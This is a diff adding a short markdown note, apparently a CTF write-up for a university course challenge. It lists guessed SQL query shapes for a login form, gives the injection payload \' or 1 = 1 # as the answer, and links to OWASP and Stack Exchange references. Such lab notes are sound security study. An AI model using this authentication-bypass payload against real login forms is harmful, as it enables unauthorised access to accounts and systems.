@@ -1,0 +1,14 @@
+- target
+    - Crack the login input box
+    - try with SQLi pattern
+        - SELECT * FROM xxx WHERE `username` = '%username' AND `password` = '%password'
+        - SELECT * FROM xxx WHERE ((`username` = '%username') AND (`password` = '%password'))
+        - SELECT * FROM xxx WHERE `username` = '%username' AND `password` = '%password'
+        - SELECT * FROM xxx WHERE `username` = '%username' AND `password` = '%password'
+        - 
+- answer
+    - \' or 1 = 1 #
+- refs
+    - https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/15
+    - https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
+    - https://security.stackexchange.com/questions/37749/no-single-quotes-is-allowed-is-this-sql-injection-point-still-exploitable
